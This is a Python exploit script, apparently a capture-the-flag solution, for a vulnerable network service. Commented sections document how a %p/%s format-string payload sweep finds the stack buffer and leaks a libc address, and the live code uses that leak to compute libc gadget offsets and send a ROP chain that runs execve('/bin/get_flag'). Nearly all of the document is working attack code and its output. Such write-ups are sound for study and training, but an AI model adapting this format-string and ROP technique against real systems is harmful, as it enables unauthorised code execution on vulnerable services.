#!/usr/bin/python3

import sys
import socket
import time
import binascii
from pwn import p64

#NOTE: relevant comments start at line 81
#NOTE: relevant non-boilerplate code starts at line 215

#assign host and port to connect to
if len(sys.argv) >= 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "hacky1"
    port = 13704

s = socket.socket()
s.connect((host, port))


#functions to communicate with server (based on funtions from qual.py)
def dbg_print(txt):
    debug = False
    if debug:
        print(txt.decode('utf-8'))

def recv_until_timed(delim, timeout):
    global s
    if type(delim) is not bytes:
        delim = delim.encode('utf-8')
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while delim not in tmp and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_until(delim):
    return recv_until_timed(delim, 0)

def recv_cnt_timed(count, timeout):
    global s
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while len(tmp) < count and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_cnt(count):
    return recv_cnt_timed(count, 0)

def send(b):
    if type(b) is not bytes:
        b = b.encode('utf-8')
    s.send(b)



# The following code was used to determine the location of buf on the stack:
#
##############################################################################
#from pwn import *
#
#for i in range(1,819):
#    sleep(0.1)
#    proc = remote(host, port)
#
#    buf_addr_low = (i*0x50).to_bytes(2, 'little')
#    buf_addr_high = b"\xff\xff\xff\x7f\x00\x00" 
#
#
#    printf_gadget = b"\x6d\x11\x40\x00\x00\x00\x00\x00" 
#
#    pop_rdi_gadget = b"\x3b\x12\x40\x00\x00\x00\x00\x00" 
#    pop_rsi_pop_r15_gadget = b"\x39\x12\x40\x00\x00\x00\x00\x00"
#
#    exploit_str_1 =  b"\x00" 
#    exploit_str_1 += 43*b"%p" 
#    exploit_str_1 += b"\x00" 
#    exploit_str_1 += pop_rdi_gadget
#    exploit_str_1 += buf_addr_low
#    exploit_str_1 += buf_addr_high
#    exploit_str_1 += printf_gadget
#    exploit_str_1 += b"\n"
#
#    proc.read() 
#    proc.write(exploit_str_1)
#
#    sleep(0.1)
#    if(proc.can_read()):
#        try:
#            retmem_1 = proc.read() 
#            print(retmem_1)
#            proc.write(b"ABORT\n");
#            if(len(retmem_1) > 4):
#                print("Versuch ")
#                print(hex(i))
#
#                print("Addr: ")
#                print(buf_addr_low + buf_addr_high)
#
#                print("AHA")
#                print(retmem_1)
#                print("\n")
#                continue
#
#        except EOFError as e:
#            print("OH OH")
#            print(e)
#            print("\n")
#            continue
#
#    proc.close();
##############################################################################
#
# for i=759 it yielded the following output:
# > [+] Opening connection to localhost on port 13704: Done
# > b'\x1b[0mp0x4020220x10xd000x7fffffffed000x40x40000a0x7ffff7e108e9(nil)0xd087d8c76030bab20x401080(nil)(nil)(nil)0x2f7827b89930bab20x2f7837855a76bab2(nil)(nil)(nil)0x1'
# > Versuch 
# > 0x2f7
# > Addr: 
# > b'0\xed\xff\xff\xff\x7f\x00\x00'
# > AHA
# > b'\x1b[0mp0x4020220x10xd000x7fffffffed000x40x40000a0x7ffff7e108e9(nil)0xd087d8c76030bab20x401080(nil)(nil)(nil)0x2f7827b89930bab20x2f7837855a76bab2(nil)(nil)(nil)0x1'
#
################################################################
#
# Since ASLR is disabled stuff in memory will always be at the same position 
#   for the same binary executed on the same system.
# The stack specifically will be located relatively close to 0xFFFFFFFFFFFFFFFF
# In the code snipped above we basically made use of the concept behind a nop-slide 
#   transferred to a printf format string.
# We filled a bit more than 80 byte of buf with %p and used a 'pop rdi; ret;' ROP-Gadget to
#   put a hardcoded address into rdi.
# Then we jump to a printf instruction within the main function, which expects its format string
#   in the rdi register.
# If we strategically ierate over addresses (starting at 0xFFFFFFFFFFFFFFFF in about 80 byte chunks),
#   we can can quickly cover a significant portion of memory to check where the stack is located
#   exactly. As long as the address we put into rdi lies somewhere within the sequence of %p in the 
#   buffer, some memory will be printed to stdout, indicating that we have found buf.
# We can then use the information of where buf is located, to for example perform a format string 
#   attack to obtain a libc address from the stack.
# In this case using the address 0x7fffffffed30 with an appropriate format string will (among other 
#   data) print an address (0x7ffff7e108e9) located within libc to stdout.
# This gives us almost all the information we need to trigger a ROP-Chain we built using offsets from 
#   the libc 2.31 binary file.
# We can also quickly figure out, that our generated guess was off by 0x30 bytes.


# By replacing the appropriate %p with %s, we can print non-NULL data at the address leaked above.
# This allows us to determine, that the binary data at the address 0x7ffff7e108e9 starts with 
#   0x49 0x89 0xc0 0xb8 0x00 (see python code snippet below)
# This snippet of binary data appears in libc-2.31.so at offset 0x238e9.
# This in turn allows us to deduce that libc starts at 0x7ffff7e108e9 - 0x238e9 = 0x7ffff7ded000
#
################################################################
#from pwn import *
#
#proc = remote(host, port)
#
#printf_gadget = b"\x6d\x11\x40\x00\x00\x00\x00\x00" 
#
#pop_rdi_gadget = b"\x3b\x12\x40\x00\x00\x00\x00\x00" 
#pop_rsi_pop_r15_gadget = b"\x39\x12\x40\x00\x00\x00\x00\x00"
#
#buf_formatstr_addr = b'\x01\xed\xff\xff\xff\x7f\x00\x00'
#
#exploit_str_1 =  b"\x00" 
#exploit_str_1 += 6*b"%p" 
#exploit_str_1 += b"%s" 
#exploit_str_1 += 36*b"%p" 
#exploit_str_1 += b"\x00" 
#exploit_str_1 += pop_rdi_gadget
#exploit_str_1 += buf_formatstr_addr
#exploit_str_1 += printf_gadget
#exploit_str_1 += b"\n"
#
#proc.read() 
#proc.write(exploit_str_1)
#sleep(1)
#retmem_1 = proc.read() 
#print(retmem_1)
################################################################
#
# The code above produces the output:
#
# [+] Opening connection to localhost on port 13704: Done
# b'\x1b[0m0x4020220x10xd000x7fffffffed000x40x40000aI\x89\xc0\xb8(nil)0x757d671f6ce47aef0x401080(nil)(nil)(nil)0x8a82986095e47aef0x8a82885d56a27aef(nil)(nil)(nil)0x10x7fffffffee480x7fffffffee580x7ffff7ffe180(nil)(nil)0x4010800x7fffffffee40(nil)(nil)0x4010aa0x7fffffffee380x1c0x10x7fffffffefc6(nil)0x7fffffffefd7(nil)0x210x7ffff7fd00000x100x78bfbfd0x60x10000x11'
# [*] Closed connection to localhost port 13704
#
################################################################

good_guess = 759 * 80
guess_addr_low = good_guess
guess_addr_high = 0x00007fffffff0000 
original_buf_addr = guess_addr_low + guess_addr_high - 0x30
original_buf_addr_str = p64(original_buf_addr)
original_buf_formatstr_addr_str = p64(original_buf_addr + 1)

###########################################################
#LOCAL DEBUG ADDR
#original_buf_formatstr_addr_str = p64(0x7fffffffdcb0 + 1)
###########################################################

vuln_printf_gadget = p64(0x40116d)
vuln_pop_rdi_gadget = p64(0x40123b)

libc_addr_exfiltration_exploit =  b"\x00" + 42*b"%p" + b"\x03\x03\x00"
libc_addr_exfiltration_exploit += vuln_pop_rdi_gadget
libc_addr_exfiltration_exploit += original_buf_formatstr_addr_str
libc_addr_exfiltration_exploit += vuln_printf_gadget
libc_addr_exfiltration_exploit += b"\n"

recv_until(b"\x1b[33m")
send(libc_addr_exfiltration_exploit)
raw_mem_leak = recv_until(b'\x03\x03')
leaked_libc_addr = int(raw_mem_leak[47:59], 16)
leaked_libc_addr_offset = 0x238e9

#calculate the beginning of libc in memory
libc_start_addr = leaked_libc_addr - leaked_libc_addr_offset #0x7ffff7ded000

#compensate for stack frame changes (add rsp,... at the end of main, and rop gadgets)
buf_addr = original_buf_addr + 0x70

libc_ropgadget_pop_rax = p64(libc_start_addr + 0x3be88)
libc_ropgadget_pop_rdi = p64(libc_start_addr + 0x23796)
libc_ropgadget_pop_rsi = p64(libc_start_addr + 0x2590f)
libc_ropgadget_pop_rdx = p64(libc_start_addr + 0xc8b8d)
libc_ropgadget_syscall = p64(libc_start_addr + 0x7ed0c) #syscall ; ret

###########################################################
#LOCAL ADDRESSES FOR DEBUGGING with Debian GLIBC 2.36-9
#libc_start_addr        = 0x7FFFF7DBB000
#buf_addr               = 0x7fffffffdcb0 + 0x70
#
#libc_ropgadget_pop_rax = p64(libc_start_addr + 0x3f0a7)
#libc_ropgadget_pop_rdi = p64(libc_start_addr + 0x27725)
#libc_ropgadget_pop_rsi = p64(libc_start_addr + 0x28ed9)
#libc_ropgadget_pop_rdx = p64(libc_start_addr + 0xfdc9d)
#libc_ropgadget_syscall = p64(libc_start_addr + 0x85fb1)
###########################################################

execve_syscall_id      = 59

flag_binary_path_str   = b"/bin/get_flag\x00"
flag_binary_path_addr  = p64(buf_addr)

#Finally we can write a simple ROP chain to execute execve("/bin/get_flag")
#Note that we can simply place the string /bin/get_flag in the buffer, 
#  since we do now know where the stack, and hence the buffer, is located.
exploit_str =  flag_binary_path_str
exploit_str += (88-len(flag_binary_path_str))*b"\x00"
exploit_str += libc_ropgadget_pop_rdi
exploit_str += flag_binary_path_addr
exploit_str += libc_ropgadget_pop_rsi
exploit_str += p64(0)
exploit_str += libc_ropgadget_pop_rdx
exploit_str += p64(0)
exploit_str += libc_ropgadget_pop_rax
exploit_str += p64(execve_syscall_id)
exploit_str += libc_ropgadget_syscall
exploit_str += b"\n"

send(exploit_str)
print(recv_until(b'\n').decode())


